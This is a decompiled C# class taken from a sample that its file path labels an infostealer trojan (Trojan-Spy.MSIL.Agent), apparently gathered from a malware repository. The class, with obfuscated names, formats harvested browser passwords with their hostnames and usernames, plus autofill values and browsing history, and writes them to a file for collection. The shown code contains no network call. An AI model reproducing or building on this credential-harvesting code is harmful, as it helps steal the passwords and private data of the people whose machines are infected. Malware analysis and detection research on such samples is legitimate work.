// Decompiled with JetBrains decompiler
// Type: AlphaCentavr.serUTilc
// Assembly: Xobntom2, Version=1.0.0.422, Culture=neutral, PublicKeyToken=null
// MVID: 7E933326-C6DC-4B1B-B81C-CFA3C6FCABF5
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan-Spy.MSIL.Agent.gen-bbc8ac47d3051fbab328d4a8a4c1c8819707ac045ab6ac94b1997dac59be2ece.exe

using System.Collections.Generic;
using System.IO;

namespace AlphaCentavr
{
  internal sealed class serUTilc
  {
    private static string bmligo(Password danatela) => string.Format("Hostname: {0}\nUsername: {1}\nPassword: {2}\n\n", (object) danatela.sUrl, (object) danatela.sUsername, (object) danatela.odrowssap);

    private static string gloryaperis(AutoFill cilonmyanc) => string.Format("{0}\t\n{1}\t\n\n", (object) cilonmyanc.sName, (object) cilonmyanc.sValue);

    private static string FormatHistory(Site fpite) => string.Format("### {0} ### ({1}) {2}\n", (object) fpite.sTitle, (object) fpite.sUrl, (object) fpite.iCount);

    public static bool malpiska(List<AutoFill> cilonmyancs, string sFile)
    {
      try
      {
        foreach (AutoFill cilonmyanc in cilonmyancs)
          File.AppendAllText(sFile, serUTilc.gloryaperis(cilonmyanc));
        return true;
      }
      catch
      {
        return false;
      }
    }

    public static bool uuTuTTui(List<Site> markys, string sFile)
    {
      try
      {
        foreach (Site marky in markys)
          File.AppendAllText(sFile, serUTilc.FormatHistory(marky));
        return true;
      }
      catch
      {
        return false;
      }
    }

    public static bool IYTRU(List<Password> fersosa, string sFile)
    {
      try
      {
        foreach (Password danatela in fersosa)
        {
          if (!(danatela.sUsername == "") && !(danatela.odrowssap == ""))
            File.AppendAllText(sFile, serUTilc.bmligo(danatela));
        }
        return true;
      }
      catch
      {
        return false;
      }
    }
  }
}
